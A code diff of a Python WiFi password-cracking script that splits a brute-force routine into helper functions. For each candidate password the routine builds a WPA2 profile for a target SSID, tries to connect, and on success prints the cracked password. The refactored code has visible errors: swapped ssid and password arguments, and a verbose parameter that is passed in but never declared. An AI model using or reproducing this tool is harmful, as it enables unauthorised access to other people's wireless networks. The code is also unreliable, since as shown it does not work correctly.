@@ -47,63 +47,71 @@ logging.basicConfig(
 
 # type = False
 
-def crack_password(wifi, ssid, password, number, verbose=False):
-    #
-    #   TODO: create_profile()
-    #
+def create_profile(
+        ssid,
+        password,
+        auth=const.AUTH_ALG_OPEN,
+        akm=const.AKM_TYPE_WPA2PSK,
+        cipher=const.CIPHER_TYPE_CCMP
+):
     profile = Profile()  # create profile instance
     profile.ssid = ssid  # name of client
-    profile.auth = const.AUTH_ALG_OPEN  # auth algo
-    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # key management
-    profile.cipher = const.CIPHER_TYPE_CCMP  # type of cipher
+    profile.auth = auth  # auth algo
+    profile.akm.append(akm)  # key management
+    profile.cipher = cipher  # type of cipher
     profile.key = password  # use generated password
-    #
-    # TODO: reset_profiles()
-    #
+    return profile
+
+
+def reset_profiles(wifi, number):
     if verbose:
         print(DARK_GREEN)
         print(PLUS, f"[{number}] total network profiles: ", len(wifi.iface.network_profiles()))
         print(PLUS, f"[{number}] remove_all_network_profiles")
-        wifi.iface.remove_all_network_profiles()  # remove all the profiles which are previously connected to device
+    wifi.iface.remove_all_network_profiles()  # remove all the profiles which are previously connected to device
+    if verbose:
         print(PLUS, f"[{number}] total network_profiles: ", len(wifi.iface.network_profiles()))
-    #
-    # TODO: add_profile()
-    #
+
+
+def add_profile(wifi, number, profile):
     print(GREEN, end="")
     print(PLUS, f"[{number}] adding profile:")
     tmp_profile = wifi.iface.add_network_profile(profile)  # add new profile
-    #
-    # TODO: dump_profile()
-    #
-    if verbose:
-        print(DARK_GREEN)
-        for var in vars(tmp_profile):
-            print(f"{var:15}: {getattr(tmp_profile, var)}")
-    #
-    #   connect
-    #
     time.sleep(1)  # if script not working change time to 1 !!!!!!
+    return tmp_profile
+
+
+def dump_profile(profile):
+    print(DARK_GREEN)
+    for var in vars(profile):
+        print(f"{var:15}: {getattr(profile, var)}")
+
+
+def crack_password(wifi, ssid, password, number, verbose=False):
+    # profile management
+    profile = create_profile(password, ssid)
+    reset_profiles(wifi, number, verbose)
+    tmp_profile = add_profile(wifi, number, profile)
+    if verbose:
+        dump_profile(tmp_profile)
+
+    #   connect
     print(GREEN, end="")
     print(PLUS, f"[{number}] connecting...")
     wifi.iface.connect(tmp_profile)  # trying to Connect
     time.sleep(1)  # 1s
-    #
+
     # wait and check
-    #
     if wifi.iface.status() == const.IFACE_CONNECTED:  # checker
-        #
         # sucess
-        #
-        time.sleep(1)
+        # time.sleep(1)
         print(BOLD, GREEN, '[*] Crack success!', RESET)
         print(BOLD, GREEN, '[*] password is ' + password, RESET)
         wifi.iface.disconnect()
         time.sleep(1)
         return True
     else:
-        #
         #   fail
-        #
         print(LIGHT_RED, '[{}] Crack Failed using {}'.format(number, password))
         return False
 
